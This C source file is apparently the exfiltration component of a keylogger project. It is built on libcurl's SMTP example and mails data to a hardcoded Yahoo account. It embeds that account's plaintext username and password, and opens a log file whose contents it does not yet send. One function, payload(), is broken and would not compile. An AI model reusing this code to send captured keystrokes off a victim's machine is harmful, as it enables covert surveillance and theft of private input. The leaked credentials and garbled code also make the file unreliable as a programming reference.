#include <stdio.h>
#include <string.h>
#include <curl/curl.h>

#define FROM    "<keylogger_project_2014@yahoo.com>"
#define TO      "<keylogger_project_2014@yahoo.com>"
//#define CC      "<roboute@gmail.com>"

static const char *payload_text[] =
{
    "Date: Mon, 29 Nov 2010 21:54:29 +1100\r\n",
    "To: " TO "\r\n",
    "From: " FROM "(Example User)\r\n",
    //"Cc: " CC "(Another example User)\r\n",
    "Message-ID: <dcd7cb36-11db-487a-9f3a-e652a9458efd@rfcpedant.example.org>\r\n",
    "Subject: Test of Sending Data\r\n",
    "\r\n", /* empty line to divide headers from body, see RFC5322 */
    "The body of the message starts here.\r\n",
    "\r\n",
    "It could be a lot of lines, could be MIME encoded, whatever.\r\n",
    "Check RFC5322.\r\n",
    NULL
};

static char* payload() {
    char* date[] = "Date: " "Mon, 29 Nov 2011 21:54:29 +1100";
    char* to[] = "To: " TO;
    char* from[] = "From: " FROM;
    char* messageID[] = "Message-ID: " "<" FROM ">";
    char* subject[] = "Subject: " "TEST 2";

    char* header[] =

    char*
}

struct upload_status
{
    int lines_read;
};

static size_t payload_source(void *ptr, size_t size, size_t nmemb, void *userp)
{
    struct upload_status *upload_ctx = (struct upload_status *)userp;
    const char *data;

    if((size == 0) || (nmemb == 0) || ((size*nmemb) < 1))
    {
        return 0;
    }

    data = payload_text[upload_ctx->lines_read];

    if(data)
    {
        size_t len = strlen(data);
        memcpy(ptr, data, len);
        upload_ctx->lines_read++;

        return len;
    }

    return 0;
}

int main_tls(const char* dbFilename)
{
    FILE* dbFile;
    dbFile = fopen(dbFilename, "r");

    CURL *curl;
    CURLcode res = CURLE_OK;
    struct curl_slist *recipients = NULL;
    struct upload_status upload_ctx;

    upload_ctx.lines_read = 0;

    curl = curl_easy_init();
    if(curl)
    {
        // Set username and password
        curl_easy_setopt(curl, CURLOPT_USERNAME, "keylogger_project_2014@yahoo.com");
        curl_easy_setopt(curl, CURLOPT_PASSWORD, "hood2014");

        // Set mailserver url
        curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.mail.yahoo.com:587");

        // Set SSL
        curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);


        /* Note that this option isn't strictly required, omitting it will result in
         * libcurl sending the MAIL FROM command with empty sender data. All
         * autoresponses should have an empty reverse-path, and should be directed
         * to the address in the reverse-path which triggered them. Otherwise, they
         * could cause an endless loop. See RFC 5321 Section 4.5.5 for more details.
         */
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM);


        // Set recipients
        recipients = curl_slist_append(recipients, TO);
        //recipients = curl_slist_append(recipients, CC);
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);



        /* We're using a callback function to specify the payload (the headers and
         * body of the message). You could just use the CURLOPT_READDATA option to
         * specify a FILE pointer to read from. */
        curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
        //curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
        curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        /* Since the traffic will be encrypted, it is very useful to turn on debug
         * information within libcurl to see what is happening during the transfer.
         */
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

        /* Send the message */
        res = curl_easy_perform(curl);

        /* Check for errors */
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));

        /* Free the list of recipients */
        curl_slist_free_all(recipients);

        /* Always cleanup */
        curl_easy_cleanup(curl);
    }

    return (int)res;
}
